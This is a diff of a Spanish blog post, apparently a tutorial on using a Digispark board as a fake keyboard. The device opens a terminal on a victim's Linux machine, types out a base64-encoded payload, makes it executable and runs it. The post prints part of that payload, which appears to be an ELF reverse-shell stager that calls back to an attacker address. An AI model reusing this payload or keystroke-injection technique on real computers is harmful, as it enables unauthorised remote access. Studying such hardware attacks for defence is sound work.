@@ -34,7 +34,7 @@ Bien, para terminar de construir este exploit hay que tranformarlo a base64 para
 # Creando el script para Digispark
 Bien, ahora pasemos a lo interesante de este post, crearemos un script en Arduino que nos permita crear un archivo b64 en la computadora victima, darle los permisos de ejecución con chmod y ejecutarlo para poder explotar el sistema. Para ello como ya he dicho nos apoyaremos en Arduino, para ponerlo en funcionamiento debereis descargarlo en la pagina oficial [arduino](https://www.arduino.cc/en/Main/Software) . Posteriormente en el arduino nos iremos a `Herramientas->Placa->Gestor de Tarjetas` y instalaremos `Digistump AVR boards`, por último en placa ya seleccionaremos `Digispark(Default - 16.5mhz)` y Fiuh listo ya podemos ponernos manos a la obra y empezar a crear nuestros primeros script para el Digispark. Como todos sabeis Arduino consta de dos funciones setup() en la cual inicializaremos los pines y cualquier otra cosa, se puede dejar en blanco y la función loop() que se repetira constantemente. Empezaremos con las lineas `#include "DigiKeyboard.h"` para poder trabajar con DigiKeyboard, que nos permitirá simular un teclado con el Digispark.
 Yo os facilitaré el código que he creado para ejecutar el script en el ordenador víctima.
-```C++
+{% highlight c++ %}
 #include "DigiKeyboard.h"
 #define KEY_DELETE 0x4C
 void setup() {
@@ -99,13 +99,12 @@ digitalWrite(1, LOW);
 delay(300);
 
 }
-```
+{% endhighlight %}
 Bien, el código es un poco enrevesado, pero después de darle unas vueltas os dareis cuenta de que lo único que hace es: Encender el led rojo fijo, abrir la terminal, escribir el payload generado y guardarlo en un archivo, cambiarle los permisos y ejecutarlo, para terminar pone el led intermitente. Es simplemente eso.
 Puedo comentaros algunos problemillas que he tenido, mi payload tenia una barra invertida entre medias entonces he tenido que dividir el print, y la barra la he puesto con la combinación de teclas que corresponde, puesto que si la escribía en el print daba errores con el teclado y no se escribia una / si no un - . Por eso en mi caso me quedaría asi ese trozo:
-```C++
+{% highlight c++ %}
 DigiKeyboard.print("f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKhkFGgCABOIieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av");
 DigiKeyboard.sendKeyStroke(KEY_7,MOD_SHIFT_RIGHT);
 DigiKeyboard.print("huAEAAAC7AQAAAM2A ");
-
-```
+{% endhighlight %}
 Ahi apreciais como separo el payload, escribo la barra `/` y ya continuo. Os menciono esto por si, a la hora de escribir vuestro payload, como evidentemente el valor cambia, os adelanto este problema.
